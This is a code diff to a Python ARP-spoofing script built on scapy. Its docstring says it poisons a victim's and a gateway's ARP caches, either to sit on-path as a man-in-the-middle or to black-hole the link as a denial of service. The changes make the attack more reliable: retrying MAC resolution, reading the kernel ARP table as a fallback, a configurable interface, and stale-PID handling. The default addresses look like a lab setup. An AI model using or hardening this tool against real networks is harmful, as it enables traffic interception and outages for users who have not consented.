@@ -22,7 +22,7 @@ start forks a detached background process that:
      on-path MITM); in mode=dos forwarding is left off, so traffic that
      arrives here is simply dropped (a denial-of-service against the link).
 
-stop sends SIGTERM to that background process, which sends a few correct
+stop sends SIGTERM to that background process, which sends correct
 ARP replies to restore both caches, disables forwarding, and exits.
 """
 import argparse
@@ -35,7 +35,7 @@ from scapy.all import ARP, Ether, conf, get_if_hwaddr, sendp, srp
 
 PID_FILE = "/tmp/arp_spoof.pid"
 LOG_FILE = "/tmp/arp_spoof.log"
-IFACE = "eth0"
+IFACE = os.environ.get("IFACE", "eth0")
 
 VICTIM_IP = os.environ.get("VICTIM_IP", "10.10.10.10")
 GATEWAY_IP = os.environ.get("GATEWAY_IP", "10.10.10.1")
@@ -54,10 +54,24 @@ def log(msg):
 def get_mac(ip, iface=IFACE, timeout=3):
     """Resolve ip's real MAC with one genuine ARP request, before we start
     forging anything — this is how we later know what to restore."""
-    req = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
-    ans, _ = srp(req, timeout=timeout, iface=iface, verbose=0)
-    for _, r in ans:
-        return r[Ether].src
+    try:
+        req = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
+        ans, _ = srp(req, timeout=timeout, iface=iface, verbose=0)
+        for _, r in ans:
+            return r[Ether].src
+    except Exception as e:
+        log(f"srp exception for {ip}: {e}")
+
+    # Fallback to kernel ARP table /proc/net/arp
+    try:
+        with open("/proc/net/arp") as f:
+            for line in f.readlines()[1:]:
+                parts = line.split()
+                if len(parts) >= 4 and parts[0] == ip and parts[3] != "00:00:00:00:00:00":
+                    return parts[3]
+    except OSError:
+        pass
+
     return None
 
 
@@ -99,8 +113,22 @@ def poison_loop(victim_ip, gateway_ip, mode):
     victim_mac = get_mac(victim_ip)
     gateway_mac = get_mac(gateway_ip)
     if not victim_mac or not gateway_mac:
+        log(f"initial MAC resolution timed out (victim={victim_mac}, gateway={gateway_mac}). Retrying...")
+        for _ in range(5):
+            time.sleep(1)
+            victim_mac = victim_mac or get_mac(victim_ip)
+            gateway_mac = gateway_mac or get_mac(gateway_ip)
+            if victim_mac and gateway_mac:
+                break
+
+    if not victim_mac or not gateway_mac:
         log("FATAL: could not resolve real MACs for victim/gateway, aborting")
+        try:
+            os.remove(PID_FILE)
+        except OSError:
+            pass
         sys.exit(1)
+
     log(f"real MACs learned: victim={victim_mac} gateway={gateway_mac}")
 
     def handle_term(signum, frame):
@@ -133,8 +161,16 @@ def poison_loop(victim_ip, gateway_ip, mode):
 
 def cmd_start(args):
     if os.path.exists(PID_FILE):
-        print("a poison process already appears to be running (pid file exists)")
-        sys.exit(1)
+        try:
+            with open(PID_FILE) as f:
+                pid = int(f.read().strip())
+            # Check if process is actually running
+            os.kill(pid, 0)
+            print("a poison process already appears to be running (pid file exists)")
+            sys.exit(1)
+        except (ProcessLookupError, ValueError):
+            # Stale PID file, clean up and proceed
+            pass
 
     pid = os.fork()
     if pid > 0:
@@ -157,8 +193,13 @@ def cmd_stop(_args):
     if not os.path.exists(PID_FILE):
         print("no poison process is running")
         return
-    with open(PID_FILE) as f:
-        pid = int(f.read().strip())
+    try:
+        with open(PID_FILE) as f:
+            pid = int(f.read().strip())
+    except (OSError, ValueError):
+        print("invalid pid file")
+        return
+
     try:
         os.kill(pid, signal.SIGTERM)
         print(f"sent SIGTERM to pid {pid}; ARP tables will be restored")
@@ -171,7 +212,16 @@ def cmd_stop(_args):
 
 
 def cmd_status(_args):
-    print("running" if os.path.exists(PID_FILE) else "stopped")
+    if os.path.exists(PID_FILE):
+        try:
+            with open(PID_FILE) as f:
+                pid = int(f.read().strip())
+            os.kill(pid, 0)
+            print("running")
+            return
+        except (ProcessLookupError, ValueError):
+            pass
+    print("stopped")
 
 
 def main():
